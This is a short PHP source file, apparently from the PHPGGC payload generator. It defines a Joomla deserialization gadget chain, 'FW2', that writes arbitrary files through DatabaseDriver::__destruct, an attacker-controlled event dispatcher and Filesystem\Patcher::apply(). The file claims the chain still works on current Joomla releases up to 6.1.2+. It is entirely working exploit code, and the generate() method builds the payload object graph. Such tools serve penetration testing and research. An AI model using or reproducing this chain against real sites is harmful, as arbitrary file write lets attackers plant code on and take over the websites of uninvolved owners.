<?php

namespace GadgetChain\Joomla;

class FW2 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '4.0.0 <= 6.1.2+';
    public static $vector = '__destruct';
    public static $author = 'joaovarelas';
    public static $information =
        'File write via Joomla\\Database\\DatabaseDriver::__destruct(). Unlike ' .
        'Joomla/FW1 (Log\\Logger\\FormattedtextLogger, fixed in 5.2.2 by a ' .
        '__wakeup guard), this chain relies on the Database, Event and ' .
        'Filesystem framework packages and still works on current releases. ' .
        'MysqliDriver::disconnect() dispatches an onAfterDisconnect event ' .
        'through an attacker-controlled Event\\Dispatcher, whose untyped ' .
        '$listeners invoke Filesystem\\Patcher::apply() -> File::write().';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        $patcher    = new \Joomla\Filesystem\Patcher($path, $data);
        $dispatcher = new \Joomla\Event\Dispatcher([$patcher, 'apply']);

        return new \Joomla\Database\Mysqli\MysqliDriver($dispatcher);
    }
}
